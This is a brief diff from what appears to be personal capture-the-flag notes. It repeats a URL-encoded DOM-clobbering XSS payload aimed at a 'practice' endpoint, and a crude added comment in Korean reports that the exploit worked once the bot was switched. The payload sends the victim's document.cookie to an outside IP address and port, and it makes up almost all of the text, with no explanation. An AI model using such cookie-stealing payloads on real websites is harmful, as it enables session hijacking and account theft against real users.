@@ -89,3 +89,5 @@ practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+h
 practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'http://211.250.216.249:7000/'%2Bdocument.cookie">href</a>
 
 practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'http://211.250.216.249:7000/'%2Bdocument.cookie">href</a>
+
+는 개소리였고 걍 봇이 안되는거였음 봇 바꾸니까 익스됨 ㅅㅄㅄㅄㅄㅂ
